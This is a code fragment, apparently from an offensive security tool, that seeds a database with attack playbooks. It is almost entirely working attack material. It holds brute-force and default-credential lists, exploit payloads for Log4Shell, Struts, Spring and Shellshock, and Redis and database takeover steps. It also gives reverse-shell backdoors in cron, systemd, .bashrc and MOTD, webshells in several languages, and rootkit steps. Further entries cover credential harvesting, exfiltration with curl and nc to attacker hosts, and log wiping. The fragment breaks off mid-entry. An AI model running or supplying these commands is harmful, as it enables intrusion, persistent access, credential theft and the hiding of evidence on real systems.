            "command": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4 -vV",
            "description": "4-thread SSH brute force with verbose output",
            "requires_auth": True,
            "risk": "high",
            "detection": "Failed login attempts in auth.log",
        }, "mitre"))

        seed.append(("exploit_pattern", "ssh_default_creds", {
            "name": "SSH Default Credentials",
            "command": "sshpass -p 'admin' ssh admin@{target}",
            "credentials": ["admin:admin", "root:root", "root:toor", "root:password", "admin:password", "user:user", "root:123456", "admin:1234"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "ftp_anon_exploit", {
            "name": "FTP Anonymous Access Exploitation",
            "steps": [
                "1. nmap --script ftp-anon {target}",
                "2. ftp anonymous@{target}",
                "3. cd / (explore full filesystem)",
                "4. wget ftp://{target}/etc/passwd",
                "5. wget ftp://{target}/etc/shadow (if readable)",
                "6. Upload webshell if writable: PUT shell.php",
            ],
            "requires_auth": False,
        }, "mitre"))

        seed.append(("exploit_pattern", "smb_exploitation", {
            "name": "SMB Exploitation Chain",
            "steps": [
                "1. enum4linux -a {target}",
                "2. smbclient -N //{target}/share -L",
                "3. smbclient -N //{target}/share -c 'get /etc/passwd'",
                "4. If EternalBlue: use exploit/windows/smb/ms17_010_eternalblue",
                "5. If writable share: upload reverse shell",
                "6. Crack SMB hashes: john --wordlist=rockyou.txt smb_hashes.txt",
            ],
            "tools": ["enum4linux", "smbclient", "msfconsole"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "redis_exploitation", {
            "name": "Redis Unauthorized Access Exploitation",
            "steps": [
                "1. redis-cli -h {target} INFO (check version)",
                "2. redis-cli -h {target} KEYS * (list keys)",
                "3. SSH Key Write: redis-cli -h {target} CONFIG SET dir /root/.ssh",
                "   redis-cli -h {target} CONFIG SET dbfilename authorized_keys",
                "   redis-cli -h {target} SET x '\\n\\nssh-rsa AAAA...\\n\\n'",
                "   redis-cli -h {target} SAVE",
                "4. Crontab Write: redis-cli -h {target} CONFIG SET dir /var/spool/cron",
                "   redis-cli -h {target} CONFIG SET dbfilename root",
                "   redis-cli -h {target} SET x '\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n'",
                "   redis-cli -h {target} SAVE",
                "5. Webshell: CONFIG SET dir /var/www/html && CONFIG SET dbfilename shell.php",
            ],
            "tools": ["redis-cli"],
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "mysql_exploitation", {
            "name": "MySQL Exploitation",
            "steps": [
                "1. mysql -h {target} -u root -p",
                "2. Brute Force: hydra -l root -P rockyou.txt mysql://{target}",
                "3. UDF Privesc: SELECT sys_exec('id');",
                "4. File Read: SELECT LOAD_FILE('/etc/passwd');",
                "5. File Write: SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
                "6. Linked Server: EXEC master.dbo.xp_cmdshell 'whoami';",
            ],
            "tools": ["mysql", "hydra"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "postgresql_exploitation", {
            "name": "PostgreSQL Exploitation",
            "steps": [
                "1. psql -h {target} -U postgres",
                "2. Brute Force: hydra -l postgres -P rockyou.txt postgres://{target}",
                "3. Command Exec: SELECT lo_from_bytea(0, '\\x3c3f706870...');",
                "4. File Read: COPY (SELECT pg_read_file('/etc/passwd')) TO '/tmp/out';",
                "5. Copy: COPY accounts TO '/tmp/accounts.csv' CSV;",
                "6. UDF: CREATE FUNCTION system(cstring) RETURNS int AS '/usr/lib/libc.so.6', 'system';",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "tomcat_exploitation", {
            "name": "Apache Tomcat Exploitation",
            "steps": [
                "1. hydra -l tomcat -P rockyou.txt http-get://{target}/manager/html",
                "2. Upload WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war",
                "3. curl -u tomcat:password --upload-file shell.war http://{target}/manager/text/deploy?path=/shell",
                "4. Access: http://{target}/shell/cmd.jsp",
                "5. If manager not found: search for /host-manager/html",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "iis_exploitation", {
            "name": "IIS Exploitation",
            "steps": [
                "1. Directory Enum: gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
                "2. WebDAV: davtest -url http://{target}",
                "3. PUT file: curl -T shell.aspx http://{target}/uploads/shell.aspx",
                "4. ASPX Webshell: msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker -f aspx -o shell.aspx",
                "5. Shortname: dir /b /s C:\\*.aspx (via command injection)",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "apache_struts_exploits", {
            "name": "Apache Struts Exploits",
            "cves": ["CVE-2017-5638", "CVE-2018-11776", "CVE-2017-9805"],
            "command": "curl -H 'Content-Type: %{#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Struts\",\"Vulnerable\")}' http://{target}/action",
            "description": "OGNL injection in Content-Type header",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "spring_exploits", {
            "name": "Spring Framework Exploits",
            "cves": ["CVE-2022-22963", "CVE-2022-22965"],
            "command": "curl -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")' http://{target}/functionRouter",
            "description": "Spring4Shell and Spring Cloud Function RCE",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "log4j_exploitation", {
            "name": "Log4Shell (CVE-2021-44228)",
            "command": "curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://{target}/api",
            "description": "JNDI injection via Log4j. Send payload in any header, User-Agent, or input field.",
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "smb_relay_attack", {
            "name": "SMB Relay Attack",
            "steps": [
                "1. Responder -I eth0 (capture NTLM hashes)",
                "2. ntlmrelayx.py -t {target} -smb2support",
                "3. Force authentication: powershell -c 'Invoke-WebRequest http://attacker/share'",
                "4. Relay to target for command execution",
            ],
            "tools": ["responder", "ntlmrelayx.py", "impacket"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "llmnr_nbtns_poisoning", {
            "name": "LLMNR/NBT-NS Poisoning",
            "steps": [
                "1. responder -I eth0 -wrf",
                "2. Wait for victims to request shares",
                "3. Capture NTLMv2 hashes",
                "4. Crack: hashcat -m 5600 hash.txt rockyou.txt",
            ],
            "tools": ["responder", "hashcat"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "kerberoasting", {
            "name": "Kerberoasting",
            "steps": [
                "1. GetUserSPNs.py domain/user:pass -request",
                "2. Hashcat: hashcat -m 13100 spn_hashes.txt rockyou.txt",
                "3. If cracked: psexet.py domain/svc_account:password@target",
            ],
            "tools": ["impacket", "hashcat"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "as_reproasting", {
            "name": "AS-REP Roasting",
            "steps": [
                "1. GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt",
                "2. Hashcat: hashcat -m 18200 asrep.txt rockyou.txt",
                "3. Use cracked password for lateral movement",
            ],
            "tools": ["impacket", "hashcat"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "dcsync_attack", {
            "name": "DCSync Attack",
            "command": "secretsdump.py domain/admin:pass@dc_ip",
            "description": "Replicate domain controller to extract all password hashes",
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "golden_ticket", {
            "name": "Golden Ticket",
            "steps": [
                "1. Get krbtgt hash: secretsdump.py domain/admin:pass@dc_ip -just-dc-user krbtgt",
                "2. Create ticket: ticketer.py -nthash krbtgt_HASH -domain-sid S-1-5-21-... -domain DOMAIN user",
                "3. Export: export KRB5CCNAME=user.ccache",
                "4. Access: psexet.py -k -no-pass domain/user@target",
            ],
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "silver_ticket", {
            "name": "Silver Ticket",
            "steps": [
                "1. Get service hash: secretsdump.py domain/admin:pass@target -just-dc-user svc_account",
                "2. Create ticket: ticketer.py -nthash SVC_HASH -domain-sid SID -domain DOMAIN -spn cifs/target user",
                "3. Access SMB: smbclient.krb5 -k -no-pass user@target -c 'ls'",
            ],
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))

        seed.append(("exploit_pattern", "smb_signing_bypass", {
            "name": "SMB Signing Bypass",
            "command": "crackmapexec smb {target} --gen-relay-list targets.txt",
            "description": "Find hosts without SMB signing for relay attacks",
            "tools": ["crackmapexec", "ntlmrelayx"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "ipv6_poisoning", {
            "name": "IPv6 LLMNR Poisoning",
            "steps": [
                "1. mitm6 -d domain.com -w",
                "2. ntlmrelayx.py -6 -t dc_ip -l /tmp.loot",
                "3. Wait for DNS update requests",
                "4. Relay NTLM auth to DC",
            ],
            "tools": ["mitm6", "ntlmrelayx"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "wpbrute", {
            "name": "WordPress Brute Force",
            "command": "wpscan --url http://{target} -U admin -P /usr/share/wordlists/rockyou.txt --threads 50",
            "description": "WordPress login brute force with enumeration",
            "tools": ["wpscan"],
            "requires_auth": True,
        }, "owasp"))

        seed.append(("exploit_pattern", "jboss_exploitation", {
            "name": "JBoss Exploitation",
            "steps": [
                "1. Deploy WAR: curl -X POST http://{target}/jmx-console/HtmlAdaptor --data 'action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=http://attacker/evil.war'",
                "2. If JMX: java -jar jmx-cli.jar -i {target}",
                "3. JMX Console: http://{target}/jmx-console/",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("exploit_pattern", "weblogic_exploitation", {
            "name": "Oracle WebLogic Exploitation",
            "cves": ["CVE-2019-2725", "CVE-2020-14882", "CVE-2021-2109"],
            "command": "python3 weblogic_poc.py {target} 7001",
            "description": "WebLogic deserialization and path traversal RCE",
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # CVE PATTERNS (20)
        # ══════════════════════════════════════════════════════
        seed.append(("cve_pattern", "eternalblue_ms17_010", {
            "name": "EternalBlue (MS17-010)", "cve": "CVE-2017-0144",
            "target": "SMB (445)", "affected": "Windows 7, Server 2008 R2",
            "exploit": "ms17_010_eternalblue", "severity": "critical",
        }, "mitre"))

        seed.append(("cve_pattern", "bluekeep_cve_2019_0708", {
            "name": "BlueKeep (CVE-2019-0708)", "cve": "CVE-2019-0708",
            "target": "RDP (3389)", "affected": "Windows 7, Server 2008",
            "severity": "critical",
        }, "mitre"))

        seed.append(("cve_pattern", "log4shell_cve_2021_44228", {
            "name": "Log4Shell", "cve": "CVE-2021-44228",
            "target": "Any Log4j 2.x", "severity": "critical",
            "description": "JNDI injection in Log4j. Exploit via any input header.",
            "exploit": "curl -H 'X-Api-Version: ${jndi:ldap://attacker/a}' target",
        }, "mitre"))

        seed.append(("cve_pattern", "spring4shell_cve_2022_22965", {
            "name": "Spring4Shell", "cve": "CVE-2022-22965",
            "target": "Spring Framework < 5.3.18", "severity": "critical",
            "description": "RCE via data binding in Spring Framework on JDK 9+",
        }, "mitre"))

        seed.append(("cve_pattern", "proxylogon_cve_2021_26855", {
            "name": "ProxyLogon", "cve": "CVE-2021-26855",
            "target": "Microsoft Exchange", "severity": "critical",
            "description": "SSRF in Exchange leading to RCE. Chain with CVE-2021-27065 for write.",
        }, "mitre"))

        seed.append(("cve_pattern", "proxyshell_cve_2021_34473", {
            "name": "ProxyShell", "cve": "CVE-2021-34473",
            "target": "Microsoft Exchange", "severity": "critical",
            "description": "Pre-auth RCE chain in Exchange. CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207",
        }, "mitre"))

        seed.append(("cve_pattern", "dirty_pipe_cve_2022_0847", {
            "name": "Dirty Pipe", "cve": "CVE-2022-0847",
            "target": "Linux Kernel 5.8+", "severity": "critical",
            "description": "Overwrite arbitrary read-only files. Local privilege escalation.",
        }, "mitre"))

        seed.append(("cve_pattern", "dirty_cow_cve_2016_5195", {
            "name": "Dirty COW", "cve": "CVE-2016-5195",
            "target": "Linux Kernel < 4.8.3", "severity": "high",
            "description": "Race condition in memory management. Local privilege escalation.",
        }, "mitre"))

        seed.append(("cve_pattern", "heartbleed_cve_2014_0160", {
            "name": "Heartbleed", "cve": "CVE-2014-0160",
            "target": "OpenSSL 1.0.1 - 1.0.1f", "severity": "critical",
            "description": "Memory disclosure in TLS heartbeat. Read server memory including keys.",
        }, "mitre"))

        seed.append(("cve_pattern", "shellshock_cve_2014_6271", {
            "name": "Shellshock", "cve": "CVE-2014-6271",
            "target": "Bash < 4.3", "severity": "critical",
            "description": "Arbitrary command execution via environment variable injection.",
            "exploit": "curl -H 'User-Agent: () { :; }; echo; /bin/id' http://target/cgi-bin/vulnerable.cgi",
        }, "mitre"))

        seed.append(("cve_pattern", "struts2_cve_2017_5638", {
            "name": "Apache Struts2 RCE", "cve": "CVE-2017-5638",
            "target": "Apache Struts 2.3.x - 2.3.31, 2.5.x - 2.5.10", "severity": "critical",
            "description": "OGNL injection in Content-Type header during file upload.",
        }, "mitre"))

        seed.append(("cve_pattern", "redis_unauth", {
            "name": "Redis Unauthorized Access", "cve": "N/A (misconfiguration)",
            "target": "Redis (6379)", "severity": "high",
            "description": "Redis without auth allows SSH key write, crontab write.",
        }, "mitre"))

        seed.append(("cve_pattern", "memcached_amplification", {
            "name": "Memcached Amplification", "cve": "N/A (misconfiguration)",
            "target": "Memcached (11211)", "severity": "high",
            "description": "DDoS amplification vector. Can amplify traffic 10,000x.",
        }, "mitre"))

        seed.append(("cve_pattern", "mongodb_unauth", {
            "name": "MongoDB Unauthorized", "cve": "N/A (misconfiguration)",
            "target": "MongoDB (27017)", "severity": "high",
            "description": "MongoDB without auth exposes all data.",
        }, "mitre"))

        seed.append(("cve_pattern", "elasticsearch_unauth", {
            "name": "Elasticsearch Unauthorized", "cve": "N/A (misconfiguration)",
            "target": "Elasticsearch (9200)", "severity": "high",
            "description": "Elasticsearch without auth allows data read/write and RCE.",
        }, "mitre"))

        seed.append(("cve_pattern", "docker_api_exposure", {
            "name": "Docker API Exposure", "cve": "N/A (misconfiguration)",
            "target": "Docker API (2375/2376)", "severity": "critical",
            "description": "Docker API exposed without TLS. Full root access to host.",
            "exploit": "curl http://target:2375/containers/json",
        }, "mitre"))

        seed.append(("cve_pattern", "kubernetes_dashboard", {
            "name": "Kubernetes Dashboard Unauthorized", "cve": "N/A (misconfiguration)",
            "target": "K8s Dashboard (8443)", "severity": "high",
            "description": "Kubernetes dashboard exposed without authentication.",
        }, "mitre"))

        seed.append(("cve_pattern", "jenkins_unauth", {
            "name": "Jenkins Unauthorized Access", "cve": "N/A (misconfiguration)",
            "target": "Jenkins (8080)", "severity": "high",
            "description": "Jenkins without auth allows script console RCE.",
            "exploit": "http://target:8080/script (Groovy script console)",
        }, "mitre"))

        seed.append(("cve_pattern", "gitlab_cve_2021_22214", {
            "name": "GitLab RCE", "cve": "CVE-2021-22214",
            "target": "GitLab", "severity": "critical",
            "description": "Import from remote URL leads to SSRF and RCE.",
        }, "mitre"))

        seed.append(("cve_pattern", "fortinet_cve_2022_40684", {
            "name": "Fortinet FortiOS Authentication Bypass", "cve": "CVE-2022-40684",
            "target": "FortiOS", "severity": "critical",
            "description": "Authentication bypass via crafted HTTP header.",
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # SCAN PROFILES & TECHNIQUES (15)
        # ══════════════════════════════════════════════════════
        seed.append(("scan_profile", "aggressive_full", {
            "name": "Aggressive Full Scan",
            "command": "nmap -A -T4 --max-rate 10000 -p- {target}",
            "description": "Full port scan with OS detection, version detection, scripts, and traceroute.",
            "duration": "5-15min per host",
        }, "internal"))

        seed.append(("scan_profile", "quick_full_port", {
            "name": "Quick Full Port Scan",
            "command": "nmap -sS -T4 -p- --max-rate 10000 {target}",
            "description": "SYN scan all 65535 ports at maximum speed.",
            "duration": "30-90s per host",
        }, "internal"))

        seed.append(("scan_profile", "vuln_exploit", {
            "name": "Vulnerability & Exploit Scan",
            "command": "nmap --script vuln,exploit -T4 --max-rate 5000 {target}",
            "description": "Run all vulnerability and exploit scripts.",
            "duration": "5-20min per host",
        }, "internal"))

        seed.append(("scan_profile", "web_deep", {
            "name": "Deep Web Application Scan",
            "commands": [
                "nikto -h {target} -Tuning 1234567890abcde",
                "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js -t 50",
                "wfuzz -c /tmp/wfuzz.conf -z file,/usr/share/wordlists/dirb/common.txt http://{target}/FUZZ",
            ],
            "description": "Nikto + Gobuster + Wfuzz for complete web enumeration.",
            "duration": "10-30min",
        }, "internal"))

        seed.append(("scan_profile", "smb_deep", {
            "name": "SMB Deep Enumeration",
            "commands": [
                "enum4linux -a -v {target}",
                "smbclient -N //{target}/share -L",
                "smbmap -H {target} -R",
                "nmap --script smb-enum-shares,smb-enum-users,smb-vuln* -p 445 {target}",
            ],
            "description": "Complete SMB enumeration and vulnerability check.",
            "duration": "5-15min",
        }, "internal"))

        seed.append(("scan_profile", "snmp_enum", {
            "name": "SNMP Enumeration",
            "commands": [
                "snmpwalk -v2c -c public {target}",
                "snmp-check {target} -c public",
                "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common_snmp_community_strings.txt {target}",
            ],
            "description": "SNMP community string brute force and enumeration.",
            "duration": "2-5min",
        }, "internal"))

        seed.append(("scan_profile", "dns_enum", {
            "name": "DNS Enumeration",
            "commands": [
                "nmap --script dns-brute,dns-zone-transfer -p 53 {target}",
                "dnsrecon -d {target} -t std,rvr,mx,axfr",
                "dnsenum --enum {target}",
            ],
            "description": "DNS zone transfer, brute force, and record enumeration.",
            "duration": "2-5min",
        }, "internal"))

        seed.append(("scan_profile", "ldap_enum", {
            "name": "LDAP Enumeration",
            "commands": [
                "ldapsearch -x -h {target} -b dc=domain,dc=com",
                "ldapsearch -x -h {target} -b 'cn=Users,dc=domain,dc=com'",
                "nmap --script ldap-search -p 389 {target}",
            ],
            "description": "LDAP enumeration for user and group information.",
            "duration": "2-5min",
        }, "internal"))

        seed.append(("scan_profile", "nse_vuln_scripts", {
            "name": "NSE Vulnerability Scripts",
            "scripts": [
                "vuln", "exploit", "auth", "brute",
                "smb-vuln*", "http-vuln*", "ssl-*",
                "ftp-anon", "ssh-auth-methods",
            ],
            "description": "Run all NSE vulnerability detection scripts.",
        }, "internal"))

        seed.append(("scan_profile", "wifi_deauth", {
            "name": "WiFi Deauthentication Attack",
            "commands": [
                "airmon-ng start wlxc4e984dfb30f",
                "airodump-ng --bssid {bssid} --channel {ch} -w /tmp/cap wlan0mon",
                "aireplay-ng -0 10 -a {bssid} wlan0mon",
                "aircrack-ng -w rockyou.txt /tmp/cap-01.cap",
            ],
            "description": "Capture WPA2 handshake via deauthentication.",
            "requires_auth": True,
        }, "internal"))

        seed.append(("scan_profile", "wifi_wps_attack", {
            "name": "WPS PIN Attack",
            "commands": [
                "wash -i wlxc4e984dfb30f",
                "reaver -i wlxc4e984dfb30f -b {bssid} -vv",
                "bully -b {bssid} -c {ch} -d -v 3",
            ],
            "description": "Brute force WPS PIN to recover WPA2 password.",
            "requires_auth": True,
        }, "internal"))

        seed.append(("scan_profile", "bluetooth_enum", {
            "name": "Bluetooth Enumeration",
            "commands": [
                "hcitool scan",
                "hcitool inq",
                "sdptool browse {mac}",
                "btscan -i hci0",
            ],
            "description": "Discover and enumerate Bluetooth devices and services.",
        }, "internal"))

        seed.append(("scan_profile", "netbios_enum", {
            "name": "NetBIOS Enumeration",
            "commands": [
                "nbtscan {target}",
                "nmap --script nbstat -p 137 {target}",
                "enum4linux -U {target}",
            ],
            "description": "NetBIOS name resolution and user enumeration.",
        }, "internal"))

        seed.append(("scan_profile", "aggressive_web", {
            "name": "Aggressive Web Scan",
            "commands": [
                "nikto -h {target} -Tuning 67890abcde -timeout 5",
                "dirb http://{target} /usr/share/wordlists/dirb/big.txt -r -z 100",
                "whatweb -a 3 {target}",
                "curl -s http://{target}/robots.txt",
                "curl -s http://{target}/.env",
                "curl -s http://{target}/.git/config",
            ],
            "description": "Aggressive web app discovery including sensitive files.",
        }, "internal"))

        seed.append(("scan_profile", "ssh_enum", {
            "name": "SSH Enumeration",
            "commands": [
                "nmap -sV -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods {target}",
                "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p test ssh://{target} -t 1 -V",
            ],
            "description": "SSH version and configuration enumeration.",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # BACKDOOR & PERSISTENCE (15)
        # ══════════════════════════════════════════════════════
        seed.append(("backdoor", "ssh_key_backdoor", {
            "name": "SSH Authorized Keys Backdoor",
            "command": "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",
            "description": "Add attacker SSH key for persistent access.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "cron_backdoor", {
            "name": "Cron Job Backdoor",
            "command": "echo '*/5 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1' | crontab -",
            "description": "Reverse shell every 5 minutes via cron.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "systemd_service", {
            "name": "Systemd Service Backdoor",
            "steps": [
                "1. Create /etc/systemd/system/update.service",
                "2. [Service] ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'",
                "3. [Install] WantedBy=multi-user.target",
                "4. systemctl enable update.service",
            ],
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "motd_backdoor", {
            "name": "MOTD Backdoor",
            "command": "echo 'bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"' >> /etc/update-motd.d/00-header",
            "description": "Execute on every login via MOTD scripts.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "dotfile_backdoor", {
            "name": "Dotfile Backdoor",
            "command": "echo 'bash -i >& /dev/tcp/attacker/4444 0>&1 &' >> /root/.bashrc",
            "description": "Reverse shell on every bash login.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "pam_backdoor", {
            "name": "PAM Backdoor",
            "steps": [
                "1. cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so",
                "2. Modify to add backdoor: add 'int __attribute__((constructor)) init(){system(\"/tmp/backdoor\");}'",
                "3. Replace original: cp /tmp/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so",
            ],
            "requires_auth": True, "risk": "critical",
        }, "mitre"))

        seed.append(("backdoor", "rootkit", {
            "name": "Simple Rootkit (LD_PRELOAD)",
            "steps": [
                "1. Create shared library with hidden backdoor",
                "2. echo '/tmp/evil.so' >> /etc/ld.so.preload",
                "3. All processes now load the rootkit",
            ],
            "requires_auth": True, "risk": "critical",
        }, "mitre"))

        seed.append(("backdoor", "reverse_portknock", {
            "name": "Reverse Shell via Port Knocking",
            "steps": [
                "1. On target: knockd -d -i eth0 -s /etc/knockd.conf",
                "2. Config: sequence = 7000,8000,9000",
                "3. On attacker: knock target 7000 8000 9000",
                "4. Port opens and reverse shell connects",
            ],
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "webshell_variants", {
            "name": "Webshell Variants",
            "shells": {
                "php": "<?php echo system($_GET['cmd']); ?>",
                "php_exec": "<?php exec($_GET['cmd'], $out); echo implode('\\n', $out); ?>",
                "jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "aspx": "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]);%>",
                "perl": "#!/usr/bin/perl -w print `$_GET['cmd']`;",
            },
            "requires_auth": True, "risk": "high",
        }, "owasp"))

        seed.append(("backdoor", "dns_over_https_tunnel", {
            "name": "DNS over HTTPS C2 Tunnel",
            "steps": [
                "1. Set up DNS server with DOH support",
                "2. Encode commands in DNS queries",
                "3. Decode on C2 server",
                "4. Responses encoded in DNS answers",
            ],
            "tools": ["iodine", "dnscat2", "dns2tcp"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("backdoor", "icmp_tunnel", {
            "name": "ICMP Tunnel",
            "command": "ptunnel -p attacker_ip -lp 8000 -da target_ip -dp 22",
            "description": "Tunnel TCP connections through ICMP packets.",
            "tools": ["ptunnel", "icmpsh"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("backdoor", "named_pipe", {
            "name": "Named Pipe Backdoor (Windows)",
            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker -f exe -o update.exe",
            "description": "Create executable that mimics Windows update for persistence.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "registry_persistence", {
            "name": "Windows Registry Persistence",
            "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\Windows\\update.exe",
            "description": "Auto-start reverse shell on boot.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "schtasks_persistence", {
            "name": "Scheduled Task Persistence",
            "command": "schtasks /create /tn Update /tr C:\\Windows\\update.exe /sc onlogon /ru SYSTEM",
            "description": "Run payload on every logon as SYSTEM.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # DEFAULT CREDENTIALS DATABASE (15)
        # ══════════════════════════════════════════════════════
        seed.append(("default_creds", "common_defaults", {
            "services": {
                "ssh": ["root:root", "admin:admin", "root:toor", "root:password", "admin:password", "user:user"],
                "ftp": ["anonymous:anonymous", "ftp:ftp", "admin:admin"],
                "mysql": ["root:", "root:root", "root:password", "admin:admin"],
                "postgresql": ["postgres:postgres", "postgres:password"],
                "redis": ["", "redis:redis"],
                "mongodb": ["admin:admin", "root:root"],
                "telnet": ["admin:admin", "root:root", "cisco:cisco"],
                "smb": ["administrator:password", "guest:guest"],
                "snmp": ["public:public", "private:private", "community:community"],
                "tomcat": ["admin:admin", "tomcat:tomcat", "admin:password"],
                "joomla": ["admin:admin"],
                "wordpress": ["admin:admin"],
                "router": ["admin:admin", "admin:password", "root:root", "admin:1234"],
            },
        }, "internal"))

        seed.append(("default_creds", "iot_defaults", {
            "devices": {
                "ip_camera": ["admin:admin", "admin:12345", "root:root", "admin:password"],
                "router": ["admin:admin", "admin:password", "root:root", "user:user"],
                "nas": ["admin:admin", "admin:1234", "root:root"],
                "printer": ["admin:admin", "admin:password", "root:root"],
                "smart_home": ["admin:admin", "admin:password"],
            },
        }, "internal"))

        seed.append(("default_creds", "scada_ics", {
            "systems": {
                "siemens_s7": ["admin:", "user:user"],
                "modbus": ["no_auth_required"],
                "bacnet": ["no_auth_required"],
                "dnp3": ["no_auth_required"],
                "opc": ["admin:admin"],
            },
            "warning": "SCADA/ICS systems often have no authentication. Be extremely careful.",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # POST-EXPLOITATION TECHNIQUES (15)
        # ══════════════════════════════════════════════════════
        seed.append(("post_exploit", "credential_harvesting", {
            "name": "Credential Harvesting",
            "steps": [
                "1. Linux: cat /etc/passwd; cat /etc/shadow; cat /etc/gshadow",
                "2. Linux: find / -name '*.conf' -o -name '*.key' -o -name 'wp-config.php' 2>/dev/null",
                "3. Windows: reg save HKLM\\SAM /tmp/sam",
                "4. Windows: reg save HKLM\\SYSTEM /tmp/system",
                "5. Windows: mimikatz sekurlsa::logonpasswords",
                "6. Browser: find ~/.mozilla -name 'logins.json'; find ~/.config/chromium -name 'Login Data'",
                "7. SSH: find / -name 'id_rsa' -o -name 'authorized_keys' 2>/dev/null",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "persistence_techniques", {
            "name": "Persistence Installation",
            "linux": [
                "crontab -e (reverse shell every 5 min)",
                "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
                "systemctl enable evil.service",
                "echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> ~/.bashrc",
            ],
            "windows": [
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\update.exe",
                "schtasks /create /tn Update /tr C:\\update.exe /sc onlogon",
                "msfvenom -p windows/meterpreter/reverse_tcp -f exe -o update.exe",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "lateral_movement", {
            "name": "Lateral Movement",
            "techniques": [
                "psexec.py domain/user:pass@target",
                "wmiexec.py domain/user:pass@target 'cmd /c whoami'",
                "evil-winrm -i target -u user -p pass",
                "xfreerdp /v:target /u:user /p:pass",
                "ssh -J jump_host user@target",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "data_exfil_methods", {
            "name": "Data Exfiltration Methods",
            "methods": [
                "curl -X POST -d @file http://attacker.com/upload",
                "python3 -m http.server 8080 (on target)",
                "nc -w 3 attacker 4444 < file",
                "scp file user@attacker:/tmp/",
                "dns exfil: encode in DNS queries",
                "icmp exfil: encode in ICMP packets",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "covering_tracks", {
            "name": "Covering Tracks",
            "steps": [
                "1. Linux: history -c; rm /var/log/auth.log; echo > /tmp/.bash_history",
                "2. Windows: wevtutil cl Security; wevtutil cl System",
                "3. Clear bash: unset HISTFILE; export HISTFILESIZE=0",
                "4. Modify timestamps: touch -r /etc/passwd /tmp/backdoor",
